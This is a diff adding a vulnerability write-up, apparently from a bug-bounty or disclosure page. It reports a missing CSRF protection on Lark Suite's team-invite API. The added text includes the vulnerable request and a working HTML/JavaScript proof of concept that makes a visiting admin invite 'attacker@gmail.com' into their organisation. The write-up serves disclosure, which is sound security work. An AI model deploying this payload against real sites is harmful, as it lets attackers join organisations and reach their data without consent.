@@ -518,6 +518,46 @@ alert(xhr.response);
 > The extracted information could later be used to extract more information about the target orginisation.
 
 
+---
+
+#### [CSRF] No Csrf protection against sending invitation to join the team.
+
+We found a possible way through which anyone can perform a CSRF Attack and forge a request from admin's browser to join the team, as the request doesn't consists any sort of CSRF protection. 
+
+The following request was used to Invite a new member to the Team and was vulnerable to a CSRF Attack
+
+```http
+POST /create/api/v2/invite HTTP/1.1
+Host: www.larksuite.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+
+{"mobiles":[],"emails":["imunissar786@gmail.com"]}
+```
+
+
+So we created a Quick POC to exploit the issue
+
+```html
+<html>
+<title>JSON CSRF POC</title>
+<body>
+<center>
+<h1> JSON CSRF POC </h1>
+<script>
+fetch('https://www.larksuite.com/create/api/v2/invite', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"mobiles":[],"emails":["attacker@gmail.com"]}'});
+</script>
+<form action="#">
+<input type="button" value="Submit" />
+</form>
+</center>
+</body>
+</html>
+```
+
+
+So as soon as someone from the team who has access to Invite Team members functionality visited our poc.html, He would invite Us to their orginisation on larksuite.
+
+
 
 
 #### About us
